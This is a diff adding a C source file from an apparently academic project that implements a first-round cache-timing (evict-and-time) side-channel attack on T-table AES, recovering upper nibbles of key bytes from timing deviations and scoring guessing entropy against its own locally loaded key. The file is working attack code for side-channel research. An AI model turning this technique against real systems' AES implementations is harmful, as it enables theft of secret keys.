@@ -1,0 +1,225 @@
+/******************************************************************************
+ * File	Name			: evict.c
+ * Organization			: Indian Institute of Technology Madras
+ * Project Involved		: First Round Attack on AES
+ * Author		    	: Surya Prasad, Sai Dheeraj
+ * Date of Creation		: 16/Oct/2022
+ * Date of freezing		: 
+ * Log Information regading 
+ * maintanance			:
+ * Synopsis			: 
+ ******************************************************************************/
+#include <stdio.h>
+#include <math.h>
+#include <string.h>
+#include <stdlib.h>
+
+#include <aes.h>
+
+#include "params.h"
+
+#define ITERATIONS (1 << 19)              /* The maximum iterations for making the statistics */
+
+AES_KEY expanded;
+
+#define TIME_THRESHOLD     8000    // To remove outliers due to context switch
+
+unsigned char pt[16];               /* Holds the Plaintext */
+unsigned char ct[16];               /* Holds the ciphertext */
+
+unsigned int ttime[16][16];         /* Holds the timing     */
+unsigned int tcount[16][16];        /* Holds the count      */
+double tavg[16][16];                /* ttime[x]/tcount[x]   */
+double deviations[16][16];          /* Deviations from tavgavg */
+double tavgavg;                     /* Average of all timings */
+
+int correct_4bits[] = {0, 0, 0, 0, 6, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};	// Added to compute GE
+
+struct mypair {
+	int idx;
+	double deviation;
+};
+
+int cmp (const void *p1, const void *p2) {
+	if ((*(struct mypair*)p1).deviation > (*(struct mypair*)p2).deviation) return 0;
+	else return 1;
+}
+
+void printtime()
+{
+	int i, c;
+	FILE *f;
+
+	f = fopen("log", "w");
+	for(c=4; c<16; ++c){
+		fprintf(f, ".............%d.........\n", c);
+		for(i=0; i<16; ++i){
+			fprintf(f, "%d  %.3f  %.4f\n", i, tavg[c][i], deviations[c][i]);
+		}
+	}
+	fclose(f);
+}
+
+unsigned int finddeviant(unsigned int c)
+{
+	int i, maxi;
+	double ttimesum, tcountsum;
+	double maxdeviation;
+
+	/* Compute average timing for c */
+	ttimesum = 0;
+	tcountsum = 0;
+	for(i=0; i<16; ++i){
+		tavg[c][i] = ttime[c][i] / (float)tcount[c][i];	
+		ttimesum += ttime[c][i];
+		tcountsum += tcount[c][i];
+	}	
+	tavgavg = ttimesum/tcountsum;
+
+	/* Compute deviations from the average time */
+	for(i=0; i<16; ++i){
+		deviations[c][i] = fabs(tavg[c][i] - tavgavg);
+	}	
+
+	/* Find the maximum deviation, this is the possible leakage */
+	maxdeviation = deviations[c][0];
+	maxi = 0;
+	for(i=1; i<16; ++i){
+		if(maxdeviation < deviations[c][i]){
+			maxdeviation = deviations[c][i];
+			maxi = i;
+		}
+	}
+
+	return maxi;
+}
+
+
+int findGE(int bytenum) {
+	int guess_entropy = 0;
+    int c = bytenum;
+    struct mypair mat[16];
+    for (int i = 0; i < 16; ++i) {
+        mat[i].idx = i;
+        mat[i].deviation = deviations[c][i];
+    }
+    qsort((void*)mat, 16, sizeof(mat[0]), cmp);
+    // for (int i = 0; i < 16; ++i) printf("%d %.4f\n", mat[i].idx, mat[i].deviation);
+    for (int i = 0; i < 16; ++i) 
+        if (mat[i].idx == correct_4bits[c]) {
+            // printf("Hi %d\n", i + 1);
+            guess_entropy += (i + 1);
+        }
+	return guess_entropy;
+}
+
+void findkeys(int bytenum)
+{
+    printf("%02d(%x) ", bytenum, finddeviant(bytenum));	
+	int ge_value = findGE(bytenum);
+	printf("%d", ge_value);
+	// fprintf(fpr, "%d,", ge_value);
+	printf("\n");
+}
+
+double attackrnd1()
+{
+	int i;
+	unsigned int start, end, timing;
+
+    // i = 0 -> 1st byte
+    // j = 0 -> Te0 T-table
+
+	FILE *f;
+	f = fopen("log", "w");
+
+	for(int bytenum = 0; bytenum < 16; bytenum++) {
+		int tablenum = bytenum%4;
+		fprintf(f, "\n\n*******Attacking byte %d of Rnd1 key*******\n", bytenum);
+		printf("Byte-%d\n", bytenum);
+
+		int ii=0, idx=0;	// Idx need not be a range as plaintext is random - Any value from 0 to 255 will work. idx is T-table index 
+
+		while(ii++ <= (ITERATIONS)){
+			/* Set a random plaintext */
+			for(i=0; i<16; ++i) pt[i] = random() & 0xff;
+
+			// Begin one encryption to put data into cache
+			AES_encrypt(pt, ct, &expanded);
+			asm volatile("mfence");
+
+			// asm volatile("clflush (%0)" :: "r" (Te0+idx)); - Here we are directly flushing the data as we have access to the table addresse. In a practical situation, we are likely using a library to do this part hence it can be replicated in a similar way
+			clean_cache_table_idx(idx, tablenum);
+			
+			// In this encr, if data got removed then it will take more time
+			start = timestamp();
+			asm volatile("mfence");
+			AES_encrypt(pt, ct, &expanded);
+			asm volatile("mfence");
+			end = timestamp();
+
+			timing = end - start;
+
+			if(timing < TIME_THRESHOLD){    		// Removing outliers due to context switch  
+				/* Record the timings */
+				// idx = pt[0] ^ kg[0]
+				ttime[bytenum][(pt[bytenum] ^ idx) >> 4] += timing; //For plotting the >> should be removed
+				tcount[bytenum][(pt[bytenum] ^ idx) >> 4] += 1;	
+			}
+
+			/* print if its time */
+			if (!(ii & (ii - 1))) {
+				printf("%08x\t", ii);
+				findkeys(bytenum);
+			}
+
+			if (ii == ITERATIONS) {
+				for(int i=0; i<16; ++i) {
+					fprintf(f, "%d  %.3f  %.4f\n", i, tavg[bytenum][i], deviations[bytenum][i]);
+				}
+			}
+		}
+	}
+	int GE = 0;
+	printf("RESULTS\n");
+	for (int l=0; l<16; l++) {
+		GE += findGE(l);
+		printf("%02d(%x) %d  ", l, finddeviant(l), findGE(l));	
+	}
+	printf("\nNet GE=%d\n", GE);
+	fclose(f);
+}
+
+
+void ReadKey(const unsigned char *filename)
+{
+	int i;
+	FILE *f;
+	unsigned int i_secretkey[16]; 
+	unsigned char uc_secretkey[16]; 
+
+	/* Read key from a file */
+	if((f = fopen(filename, "r")) == NULL){
+		printf("Cannot open key file\n");
+		exit(-1);
+	}
+	for(i=0; i<16; ++i){
+		fscanf(f, "%x", &i_secretkey[i]);
+		uc_secretkey[i] = (unsigned char) i_secretkey[i];
+	}
+	fclose(f);
+	AES_set_encrypt_key(uc_secretkey, 128, &expanded);
+}
+
+/* 
+ * The main 
+ */
+int main(int argc, char **argv)
+{
+	srandom(timestamp());
+
+	ReadKey("key");
+	printf("Getting First Round Key Relations\n");
+	attackrnd1();
+}
+
